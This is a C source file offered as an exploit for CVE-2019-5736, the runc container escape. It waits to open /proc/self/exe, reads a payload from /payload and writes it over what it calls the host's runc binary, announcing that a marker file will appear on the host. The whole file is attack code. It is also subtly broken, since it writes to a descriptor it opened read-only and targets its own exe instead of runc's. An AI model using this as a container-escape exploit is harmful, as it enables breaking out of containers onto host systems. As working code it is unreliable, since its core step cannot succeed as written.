/*
 * CVE-2019-5736 Exploit
 * Author: Adapted from public PoCs (e.g., Frichetten)
 * Purpose: Overwrite host's /proc/self/exe (which points to runc) with malicious payload.
 * Note: This version writes a file to /tmp on host to prove escape, no reverse shell.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <errno.h>

// 从 payload.c 编译出的二进制将被嵌入到此程序中
int main(int argc, char **argv) {
    printf("[+] CVE-2019-5736 Exploit\n");
    printf("[+] Waiting for runc to exec...\n");

    int fd;
    while (1) {
        // 尝试打开 /proc/self/exe（指向宿主机 runc）
        fd = open("/proc/self/exe", O_RDONLY);
        if (fd != -1) {
            break;
        }
        usleep(100000); // 等待 0.1 秒后重试
    }

    printf("[+] Successfully opened /proc/self/exe\n");

    // 读取预先编译好的 payload
    int payload_fd = open("/payload", O_RDONLY);
    if (payload_fd == -1) {
        perror("[-] Failed to open /payload");
        return 1;
    }

    struct stat st;
    fstat(payload_fd, &st);
    size_t payload_size = st.st_size;

    char *payload = malloc(payload_size);
    read(payload_fd, payload, payload_size);
    close(payload_fd);

    // 关键步骤：用 payload 覆盖 runc 二进制
    write(fd, payload, payload_size);
    close(fd);
    free(payload);

    printf("[+] Successfully overwritten runc binary on host!\n");
    printf("[+] Now wait for someone to run 'docker run' on the host.\n");
    printf("[+] When triggered, a file '/tmp/CVE-2019-5736-PWNED' will be created on the HOST.\n");

    // 保持容器运行，等待触发
    pause();
    return 0;
}